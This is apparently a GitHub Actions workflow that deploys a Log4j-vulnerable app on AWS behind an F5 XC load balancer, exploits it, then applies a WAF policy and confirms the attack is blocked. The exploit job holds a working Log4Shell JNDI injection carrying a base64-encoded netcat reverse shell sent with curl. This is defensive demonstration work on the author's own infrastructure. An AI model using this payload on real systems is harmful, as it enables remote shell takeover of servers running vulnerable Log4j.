name: Protecting Log4j vulnerability using F5 XC WAF
on:
  #push: {branches: main}
  workflow_dispatch:
    inputs:
      msg: 
        description: 'Release version tag'
        default: 'v1.0.0'  

jobs:
  F5_XC_Pool_LB_creation:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-python@v3
      - uses: hashicorp/setup-terraform@v2   
         
      # Apply Origin Pool and Load Balancer   
      - name: Origil Pool & LB creation
        id: xc_resource_create
        env:
          TF_VAR_lbdomain: ${{ secrets.TF_VAR_lbdomain}}
        run: | 
          terraform init
          terraform plan
          terraform apply --auto-approve 
                      
          
      # Uploading tfstate file consists of LB and Pool configs 
      - name: Upload Pool, LB tfstate file
        uses: actions/upload-artifact@v3
        with:
          name: pool_lb_tfstate_file
          path: terraform.tfstate
          
          
  AWS_EC2_creation:
    needs: [F5_XC_Pool_LB_creation]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-python@v3
      - uses: hashicorp/setup-terraform@v2   
      - name: Configure AWS Credentials 
        uses: aws-actions/configure-aws-credentials@v1
        with:
          aws-access-key-id: ${{secrets.AWS_ACCESS_KEY_ID}}
          aws-secret-access-key: ${{secrets.AWS_SECRET_ACCESS_KEY}}
          aws-session-token: ${{secrets.AWS_SESSION_TOKEN}}
          aws-region: ${{secrets.AWS_REGION}}
      
      #Creating AWS EC2 Ubuntu Instance
      - name: Creating AWS Instance
        id: aws_create
        run: | 
          cd AWS
          terraform init
          terraform plan
          terraform apply --auto-approve
          echo pub_ip=$(terraform-bin output -raw ec2_public_ip) >> $GITHUB_OUTPUT
          
      # Uploading AWS tfstate file       
      - name: Upload AWS tfstate file
        uses: actions/upload-artifact@v3
        with:
          name: aws_tfstate_file
          path: AWS/terraform.tfstate
          
    outputs:
      aws_pub_ip: ${{steps.aws_create.outputs.pub_ip}}
      
  LB_Domain_Status_Check:
    runs-on: ubuntu-latest
    needs: [F5_XC_Pool_LB_creation, AWS_EC2_creation]
    steps:
      # Installing python for Validation 
      - uses: actions/checkout@v3
      - uses: actions/setup-python@v3
    
    
      # Install the necessary Packages
      - name: Install the necessary packages
        run: |
          python -m pip install requests
          python -m pip install tqdm
          python -m pip install art
        
        
      - name: Run LB domain polling script
        run: |
          python lb_status_check.py ${{ secrets.TF_VAR_lbdomain}}
      - name: Validate Deployment  
        run: |
           if [ ${{ env.EXIT }} == "true" ]; then echo "application deployment unsuccessful or application not reachable"; exit 1;\
           else echo "deployment is successfull"; fi
        
        
  Exploit-Log4j-Vulnerability:
    needs: [F5_XC_Pool_LB_creation, AWS_EC2_creation, LB_Domain_Status_Check]
    runs-on: ubuntu-latest
    
    steps:
      # Sending curl request with payload from default runner
      - name: Exploiting Log4j vulnerability 
        id: exploit_log4j
        env:
          LBDOMAIN: ${{ secrets.TF_VAR_lbdomain}}
        run: |
          payload=$(echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${{needs.AWS_EC2_creation.outputs.aws_pub_ip}} 5320 >/tmp/f" | base64 | tr -d "\n" && echo)
          echo "the value of before replace is: $payload"
          modified_payload=$(echo $payload | sed "s/+/%2B/g")
          echo "the value after replace is: $modified_payload"
          test='${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/'
          result="${test}${modified_payload}}"
          echo "the result is: $result" 
          echo result=${result} >> $GITHUB_OUTPUT
          sleep 45
          curl https://"$LBDOMAIN" -H 'X-Api-Version: '${result}''
          
    outputs:
      payload: ${{steps.exploit_log4j.outputs.result}}
          
          
  Remote_Shell_access_grant_validation:
    needs: [F5_XC_Pool_LB_creation, AWS_EC2_creation, LB_Domain_Status_Check]
    runs-on: ubuntu-latest
    steps:
    
      # Installing python for Validation 
      - uses: actions/checkout@v3
      - uses: actions/setup-python@v3
      - uses: hashicorp/setup-terraform@v2   
  
      # Install the necessary Packages
      - name: Install the necessary packages
        run: pip3 install paramiko scp requests awslib
      
      # performing remote shell access to server with Log4j
      - name: Remote shell access to server 
        run: |
          python remote_shell_access_validate.py ${{needs.AWS_EC2_creation.outputs.aws_pub_ip}}
  
  
  Reverse_Shell_connection_status_check:
    needs: [F5_XC_Pool_LB_creation, AWS_EC2_creation, LB_Domain_Status_Check]
    runs-on: ubuntu-latest
    steps:
    
      # Installing python for Validation 
      - uses: actions/checkout@v3
      - uses: actions/setup-python@v3
      - uses: hashicorp/setup-terraform@v2   
  
      # Install the necessary Packages
      - name: Install the necessary packages
        run: pip3 install paramiko scp requests awslib
      
      # Reverse shell connectivity status check
      - name: Reverse shell connectivity check
        run: |
          python reverse_shell_status_check.py ${{needs.AWS_EC2_creation.outputs.aws_pub_ip}}
          
          
  F5_XC_WAF_Policy_Apply:
    needs: [F5_XC_Pool_LB_creation, AWS_EC2_creation, LB_Domain_Status_Check, Exploit-Log4j-Vulnerability, Remote_Shell_access_grant_validation, Reverse_Shell_connection_status_check]
    runs-on: ubuntu-latest
    steps:
      # Installing python for Validation 
      - uses: actions/checkout@v3
      - uses: actions/setup-python@v3
      - uses: hashicorp/setup-terraform@v2 
      
      # Download tf file to apply WAF policy   
      - name: Download application tfsate file
        uses: actions/download-artifact@v3
        with:
          name: pool_lb_tfstate_file
             
      # Deploying WAF policy to top of LB       
      - name: Deploy WAF policy
        env:
          TF_VAR_lbdomain: ${{ secrets.TF_VAR_lbdomain}}
        run: | 
          cp ./terraform.tfstate ./WAF
          cp ./variables.tf ./WAF
          cp ./certificate-latest.cert ./WAF
          cp ./private_key-latest.key ./WAF
          cd WAF
          terraform init
          terraform plan
          terraform apply --auto-approve 
          
          
      # Uploading tf file for destorying the infra
      - name: Upload WAF tfstate file after modification
        uses: actions/upload-artifact@v3
        with:
          name: pool_lb_waf_tfstate_file
          path: WAF/terraform.tfstate
  
  
  Protect_Log4j_vulnerability_with_F5_XC_WAF:
    needs: [F5_XC_Pool_LB_creation, AWS_EC2_creation, LB_Domain_Status_Check, Exploit-Log4j-Vulnerability, Remote_Shell_access_grant_validation, Reverse_Shell_connection_status_check, F5_XC_WAF_Policy_Apply]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      # Validating protection of Log4j vulnerability
      - name: Validate Log4j in app with WAF
        env:
          LBDOMAIN: ${{ secrets.TF_VAR_lbdomain}}
        run: |
          echo ${{needs.Exploit-Log4j-Vulnerability.outputs.payload}}
          sleep 15
          waf_curl_output=$(curl https://"$LBDOMAIN" -H 'X-Api-Version: ${{needs.Exploit-Log4j-Vulnerability.outputs.payload}}')
          echo $waf_curl_output
          if [[ $waf_curl_output =~ "The requested URL was rejected. Please consult with your administrator" ]] 
          then 
            echo "WAF successfully blocked Reverse shell connectivity"
          else 
            echo "Reverse shell connectivity established with WAF policy which is not expected and hence failing"
            exit 1
          fi
          
  
  Destroy:
    if: ${{ always() }}
    needs: [F5_XC_Pool_LB_creation, AWS_EC2_creation, LB_Domain_Status_Check, Exploit-Log4j-Vulnerability, Remote_Shell_access_grant_validation, Reverse_Shell_connection_status_check, F5_XC_WAF_Policy_Apply, Protect_Log4j_vulnerability_with_F5_XC_WAF]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-python@v3
      - uses: hashicorp/setup-terraform@v2
      - name: Configure AWS Credentials 
        uses: aws-actions/configure-aws-credentials@v1
        with:
          aws-access-key-id: ${{secrets.AWS_ACCESS_KEY_ID}}
          aws-secret-access-key: ${{secrets.AWS_SECRET_ACCESS_KEY}}
          aws-session-token: ${{secrets.AWS_SESSION_TOKEN}}
          aws-region: ${{secrets.AWS_REGION}}
          
      # Downloading AWS artifact    
      - name: Download AWS application tfsate file to destroy
        uses: actions/download-artifact@v3
        with:
          name: aws_tfstate_file
          
      # Destroying AWS resources created
      - name: Destroy AWS Instance created
        run: |
          cp ./terraform.tfstate ./AWS/
          cd AWS
          terraform init
          terraform plan -destroy 
          terraform destroy -auto-approve    
          
      # Downloading F5 XC artifact    
      - name: Download XC application tfsate file to destroy
        uses: actions/download-artifact@v3
        with:
          name: pool_lb_waf_tfstate_file
          
      # Destorying F5 XC resources created    
      - name: Destroy XC Pool, LB, WAF created
        run: |
          cp ./terraform.tfstate ./WAF/
          cp ./variables.tf ./WAF
          cp ./certificate-latest.cert ./WAF
          cp ./private_key-latest.key ./WAF
          cd WAF
          terraform init
          terraform plan -destroy 
          terraform destroy -auto-approve
         
      
